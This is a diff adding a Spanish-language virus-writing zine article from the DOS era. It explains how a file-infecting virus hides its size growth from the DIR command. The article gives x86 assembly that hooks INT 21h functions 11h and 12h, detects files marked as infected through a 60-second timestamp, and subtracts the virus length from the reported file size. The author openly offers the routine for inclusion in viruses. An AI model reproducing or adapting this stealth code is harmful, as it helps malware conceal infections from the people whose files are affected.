@@ -1,0 +1,149 @@
+Stealth de Directorio (FCB)
+-------------------------------------------------------------------------------
+
+Hoy en d¡a, para que un virus pueda considerase efectivo, tiene que tener
+por lo menos, alguna t‚cnica stealth.
+El stealth de memoria, es algo ya obvio e infaltable en un virus, en este
+art¡culo discutiremos otro metodo de stealth, que es muy simple y corto al
+llevarlo a la pr ctica.
+
+Un problema en estos tiempos, es que los usuarios ya estan avisados de la
+presencia de los virus, y hay mucha mas informaci¢n al respecto que cuando
+aparecieron los primer virus, y todos estaban asombrados, e imagin ndose
+bichitos meti‚ndose en la PC.
+
+Cuando algun usuario ve que sus archivos comienzan a crecer de tama¤o sin
+ninguna aparente raz¢n, saben que algo raro esta pasando y que eso 'raro'
+es seguramente un virus.
+
+Para evitar esto, es que se desarroll¢ la tecnica que describimos en este
+art¡culo. Esta t‚cnica es la de Directory Stealth (Stealth de directorio).
+Esta t‚cnica se usa para que cuando el Usuario tipee DIR, el aumento que
+produce el virus en el tama¤o de los files, al infectar estos, no sea
+notado.
+
+Cuando el usuario tipea DIR son llamadas las funciones del DOS 11h y 12h.
+Lo que haremos, es interceptar estas llamadas desde nuestro handler de
+la int 21h.
+
+Antes de seguir, tenemos que hablar del FCB (File control Block). El FCB
+es una tabla que usa el DOS para trabajar con los archivos, abrirlos,
+cerrarlos, etc etc. Hay 2 tipos de FCB, una es la NORMAL..
+
+El formato de la misma es el siguiente:
+
+offset   Size      Descripci¢n
+------------------------------------------------------------------------------
+00h       1        Drive (00=actual, 01=A:, 02=B:, 03=C: etc.)
+01h       8        Nombre del File. Si < 8 caracteres, se llena con espacios.
+09h       3        Extensi¢n del File.
+0Ch       2        Bloque actual. Apunta al bloque de registros.
+0Eh       2        Tama¤o del registro.
+10h       4        Tama¤o del File en bytes
+14h       2        Fecha
+16h       2        Hora
+18h       4        Reservado ( o sea que MS no dice para que sirve :))
+1Ch       4        Igual que el offset 10h, pero este valor es el impreso.
+20h       1        Offset del registro actual.
+21h       4        Registro relativo.
+
+Tambi‚n existe el FCB EXTENDIDO, que es igual que el FCB normal solamente
+que tiene 7 bytes mas que se agregan al principio (antes del offset 0h del
+FCB NORMAL).
+
+Offset  Size       Descripci¢n
+------------------------------------------------------------------------------
+-07h     1         contiene el valor 0FFh, que indica que el FCB es EXTENDIDO.
+-06h     5         Reservado
+-01h     1         Byte Atributo
+
+
+Cuando se pide el DIR, se ejecutan las funciones 11h y 12h de la int 21h
+y se hace la busqueda de los archivos con el contenido del FCB.
+Si la funcion termina satisfactoriamente, el contenido del FCB es copiado
+en el actual DTA.
+
+Lo que vamos a hacer, es editar esos datos que se copian al DTA.
+
+
+Primero, agregamos el codigo para interceptar a las funciones 11h y 12h en
+nuestro handler de la int 21h:
+
+Handler_21:
+           ..
+           ..
+           cmp ah,11h           ; el usuario pidi¢ dir?
+           je D_stealth         ; hacemos el stealth
+           cmp ah,12h           ; el usuario pidi¢ dir?
+           je D_stealth         ; hacemos el stealth
+           ..
+           ..
+
+Ahora vayamos directo al codigo que hace el stealth propiamente dicho.
+primero, llamamos a la int 21h original, para que nos llene el DTA con
+los datos del FILE..
+
+D_Stealth:
+          pushf                          ; simulamos un
+          call dword ptr cs:[Old21]      ; int 21h
+          or al,al                       ; si AL=0 todo salio OK.
+          jnz ERROR                      ; ag, ha ocurrido un error.. ;)
+
+
+lo que haremos a continuaci¢n es obtener la direcci¢n del DTA para poder
+modificar los datos del mismo..
+
+          push ax bx es                  ; guardamos los registros que usamos
+
+          mov ah,2fh                     ; Nos devuelve en
+          int 21h                        ; ES:BX -> direcci¢n del DTA
+
+
+Ahora, tenemos que verificar que clase de FCB es, si EXTENDIDO o NORMAL, ya
+que los offsets seran diferentes, para eso nos fijamos si el primer byte
+del FCB es 0FFH, si es asi, estamos ante un FCB EXTENDIDO, sino ante uno
+NORMAL. :).
+Si se trata del EXTENDIDO le agregamos 7 bytes a la direcci¢n del mismo,
+por los 7 bytes de mas que tiene este, y sobrepasamos estos que no nos
+sirven y quedamos apuntando al primer dato que los dos tienen en com£n.
+
+
+         cmp byte ptr es:[BX],0ffh      ; el primer byte es FF?
+         jne normal                     ; no, es FCB NORMAL
+         add bx,7h                      ; Es EXTENDIDA, le sumamos 7 bytes
+
+a continuaci¢n, tenemos que verificar si el archivo esta infectado, ya que
+sino no nos interesa arreglarle nada. Para esto suponemos que para marcar
+a los files ya infectados, lo hacemos poniendo los segundos de la hora del
+file a 60 seg, valor imposible.
+
+normal: mov ax,es:[bx+17h]              ; tomamos la hora del file del FCB
+        and ax,1fh                      ; desenmascaramos los segundos.
+        xor al,1eh                      ; son 60 segundos!?.
+                                        ; 1eh = 30 decimal, 30*2 = 60 seg.
+                                        ; XOR = CMP, pero mas rapido y corto
+        jne no_infectado                ; no son 60, no esta infectado..
+
+El codigo que sigue se ejecutar  entonces si, y solo si :), el file esta
+infectado, lo que hacemos es restarle al filesize que esta en 1Ch el
+tama¤o del virus, asi obtendremos el tama¤o original del file..
+
+        sub word ptr es:[bx+1dh],VIRLEN   ; le restamos el tama¤o del virus.
+        sbb word ptr es:[bx+1fh],0        ; por si nos da resto
+
+Listo!, a continuaci¢n restauramos los registros que usamos y volvemos de la
+int.
+
+no_infectado: pop es bx ax              ; restauramos registros
+error:        iret                      ; volvemos..
+
+Ya esta, realmente es algo f cil, y digno de incluirse en un virus, el tama¤o
+del codigo es despreciable, y sus servicios son realmente £tiles..
+
+	Esta es una forma de Directory Stealth, que es usando el FCB, que es el
+que usa el DOS al hacer el DIR, pero tambien existe otro stealth, que es por
+HANDLE, que es el sistema usado por el Norton Commander, Pctools y programas
+parecidos, para mostrar los files, ya que su manejo es mucha mas facil que por
+FCB. En un pr¢ximo articulo trataremos este metodo, que es practicamente igual.
+
+                                                            -  WM’  -
